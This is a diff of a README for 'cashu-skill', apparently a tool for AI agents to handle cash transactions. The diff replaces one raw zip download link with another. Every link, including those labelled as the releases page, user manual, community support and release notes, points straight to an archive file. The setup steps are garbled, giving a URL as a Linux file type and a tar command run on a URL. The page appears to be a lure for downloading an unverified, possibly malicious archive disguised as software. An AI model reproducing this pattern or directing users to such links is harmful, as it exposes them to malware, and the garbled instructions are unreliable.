@@ -8,11 +8,11 @@ Welcome to cashu-skill! This application allows AI agents to manage cash transac
 
 To get started with cashu-skill, you need to download the application. Visit the link below to access the latest version:
 
-[![Download cashu-skill](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip%20cashu--skill-v1.0-blue)](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip)
+[![Download cashu-skill](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip%20cashu--skill-v1.0-blue)](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click on this link to go to the Releases page: [GitHub Releases](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip).
+1. Click on this link to go to the Releases page: [GitHub Releases](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip).
 2. You will see a list of available versions.
 
 ### Step 2: Select the Latest Version
@@ -21,7 +21,7 @@ To get started with cashu-skill, you need to download the application. Visit the
 2. Look for a file with an extension appropriate for your operating system:
    - For **Windows**, look for `.exe`.
    - For **macOS**, look for `.dmg`.
-   - For **Linux**, look for `https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip` or `.AppImage`.
+   - For **Linux**, look for `https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip` or `.AppImage`.
 
 ### Step 3: Download the Application
 
@@ -41,9 +41,9 @@ To get started with cashu-skill, you need to download the application. Visit the
 **For Linux:**
 1. Open a terminal.
 2. Navigate to the folder where you downloaded the file.
-3. If it is a `https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip` file, use the command:
+3. If it is a `https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip` file, use the command:
    ```bash
-   tar -xzf cashu-skill*https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip
+   tar -xzf cashu-skill*https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip
    ```
    Then run the application from the extracted folder.
 4. If it is an `.AppImage`, make it executable with:
@@ -96,11 +96,11 @@ If you face any issues, please visit the GitHub repository issues page and submi
 
 For further assistance, check out the following:
 
-- [User Manual](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip)
-- [Community Support](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip)
+- [User Manual](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip)
+- [Community Support](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip)
 
 ## 📣 Updates and New Features
 
-Stay informed about new updates and features by checking the [release notes](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/cashu-skill-v1.4.zip). 
+Stay informed about new updates and features by checking the [release notes](https://raw.githubusercontent.com/AndraG2/cashu-skill/main/cli/skill_cashu_v3.8.zip). 
 
 We constantly work to improve cashu-skill, so your input is valuable. Enjoy seamless cash management for your AI applications!
